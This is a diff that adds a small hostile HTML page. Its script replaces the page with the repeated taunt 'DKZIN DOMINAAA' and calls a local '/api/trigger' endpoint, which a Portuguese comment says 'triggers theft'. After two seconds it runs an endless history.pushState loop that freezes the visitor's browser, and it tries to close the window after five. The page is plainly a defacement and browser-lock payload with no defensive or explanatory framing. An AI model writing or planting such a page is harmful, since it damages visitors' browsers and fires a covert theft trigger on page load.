@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html><body><script>
+let spam = "DKZIN DOMINAAA ".repeat(60)
+document.body.innerText = spam
+
+fetch("/api/trigger") // dispara roubo
+
+setTimeout(() => {
+  while(true) {
+    history.pushState(null, '', '#')
+  }
+}, 2000)
+
+setTimeout(() => window.close(), 5000)
+</script></body></html>
